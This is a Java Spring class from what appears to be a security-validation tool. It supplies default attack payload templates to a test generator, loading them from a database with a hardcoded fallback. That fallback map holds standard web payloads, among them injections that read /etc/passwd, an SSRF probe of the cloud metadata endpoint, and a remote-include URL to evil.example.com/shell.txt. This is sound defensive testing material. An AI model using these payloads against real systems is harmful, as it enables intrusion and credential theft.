package io.veriguard.combination;

import io.veriguard.database.model.combination.BaseAttackType;
import io.veriguard.database.repository.BaseAttackTypeRepository;
import jakarta.annotation.PostConstruct;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

/**
 * 基础攻击类型 → 默认 payload 模板 —— IPv6 安全验证系统 §3.6 ★2.
 *
 * <p>PR D2 阶段为内置 ~12 类硬编码 Map；PR B5 改为 DB-driven：启动时从
 * {@code base_attack_types} 表读取 ≥ 250 类 default_payload 缓存到内存。
 *
 * <p>Fallback 策略：当 DB 注入但表为空（例如首次启动 DataPack 尚未执行 / 测试态使用 no-arg
 * 构造），落到内置 LEGACY_DEFAULTS 的 21 类硬编码（保 D2 行为，避免阻塞启动）。
 *
 * <p>未知 base_attack_type 仍走 fail-fast 抛 {@link IllegalArgumentException}（与 D2 对齐）。
 */
@Component
@Slf4j
public class BaseAttackPayloadCatalog {

  /** D2 内置默认 payload —— DB 表为空 / 未注入 repo 时回退使用. */
  static final Map<String, String> LEGACY_DEFAULTS =
      Map.ofEntries(
          Map.entry("sql_injection", "' OR '1'='1"),
          Map.entry("xss", "<script>alert(1)</script>"),
          Map.entry("xxe", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"),
          Map.entry("ssrf", "http://169.254.169.254/latest/meta-data/"),
          Map.entry("rce", "; cat /etc/passwd"),
          Map.entry("command_injection", "; cat /etc/passwd"),
          Map.entry("lfi", "../../../../etc/passwd"),
          Map.entry("rfi", "http://evil.example.com/shell.txt"),
          Map.entry("path_traversal", "../../../../etc/passwd"),
          Map.entry("csrf", "<form action=\"/admin\" method=\"POST\"></form>"),
          Map.entry("open_redirect", "https://evil.example.com"),
          Map.entry("ssti", "{{7*7}}"),
          Map.entry("nosql_injection", "{\"$ne\": null}"),
          Map.entry("ldap_injection", "*)(uid=*))(|(uid=*"),
          Map.entry("xpath_injection", "' or '1'='1"),
          Map.entry("crlf_injection", "test\\r\\nSet-Cookie: hijacked=true"),
          Map.entry("http_smuggling", "Content-Length: 4\\r\\nTransfer-Encoding: chunked"),
          Map.entry("deserialization", "rO0ABXNyAA=="),
          Map.entry("file_upload", "shell.php"),
          Map.entry("auth_bypass", "admin' --"),
          Map.entry("brute_force", "admin:password"));

  private final BaseAttackTypeRepository repository;

  /** 运行时缓存（小写 name → payload）；线程安全便于热加载场景. */
  private final Map<String, String> cache = new ConcurrentHashMap<>();

  /** 标记：true = DB 加载成功且非空；false = 走 LEGACY_DEFAULTS. */
  private boolean dbBacked;

  /** Spring 注入构造器（生产路径）. */
  public BaseAttackPayloadCatalog(BaseAttackTypeRepository repository) {
    this.repository = repository;
  }

  /**
   * No-arg 构造器 —— 仅供既有非 Spring 单测兼容（{@link AttackCombinationGenerator} 测试 / 旧
   * BaseAttackPayloadCatalogTest）。直接落到 LEGACY_DEFAULTS 行为。
   */
  public BaseAttackPayloadCatalog() {
    this.repository = null;
    this.cache.putAll(LEGACY_DEFAULTS);
    this.dbBacked = false;
  }

  /** 启动时尝试从 DB 加载；表空 / repo 缺失 → 落到 LEGACY_DEFAULTS（fail-safe，不阻塞启动）. */
  @PostConstruct
  void loadFromDb() {
    if (repository == null) {
      return; // no-arg 构造已填充 LEGACY_DEFAULTS
    }
    Map<String, String> loaded = new HashMap<>();
    int withPayload = 0;
    for (BaseAttackType t : repository.findAll()) {
      String name = t.getName();
      if (name == null || name.isBlank()) {
        continue;
      }
      String payload = t.getDefaultPayload();
      if (payload == null) {
        // 允许 DB 行存在但 default_payload 为 null（兼容）—— 用 name 占位空串
        // 调用方拿到 "" 就当作 generator 的 base 字符串；transform 仍会执行
        loaded.put(name.toLowerCase(Locale.ROOT), "");
      } else {
        loaded.put(name.toLowerCase(Locale.ROOT), payload);
        withPayload++;
      }
    }
    if (loaded.isEmpty()) {
      log.warn(
          "BaseAttackPayloadCatalog: base_attack_types DB table is empty;"
              + " falling back to {} hardcoded defaults",
          LEGACY_DEFAULTS.size());
      cache.clear();
      cache.putAll(LEGACY_DEFAULTS);
      dbBacked = false;
    } else {
      cache.clear();
      cache.putAll(loaded);
      dbBacked = true;
      log.info(
          "BaseAttackPayloadCatalog: loaded {} entries from DB ({} with default_payload)",
          loaded.size(),
          withPayload);
    }
  }

  /**
   * @param baseAttackType §3.5 attack_category 枚举字符串
   * @return 默认 payload；未知类型抛 {@link IllegalArgumentException}（fail-fast）
   */
  public String defaultPayloadFor(String baseAttackType) {
    if (baseAttackType == null || baseAttackType.isBlank()) {
      throw new IllegalArgumentException("baseAttackType must not be blank");
    }
    String key = baseAttackType.toLowerCase(Locale.ROOT);
    String payload = cache.get(key);
    if (payload == null) {
      throw new IllegalArgumentException(
          "Unknown base_attack_type: '"
              + baseAttackType
              + "'. Known size: "
              + cache.size()
              + " (db_backed="
              + dbBacked
              + ")");
    }
    return payload;
  }

  /** 用于测试 / 校验. */
  public boolean isKnown(String baseAttackType) {
    return baseAttackType != null
        && cache.containsKey(baseAttackType.toLowerCase(Locale.ROOT));
  }

  /** 返回当前缓存所知 base type 集合（不可变快照）. */
  public Set<String> knownTypes() {
    return Set.copyOf(cache.keySet());
  }

  /** 当前是否由 DB 表驱动（vs. fallback 到内置 hardcoded）. */
  public boolean isDbBacked() {
    return dbBacked;
  }
}
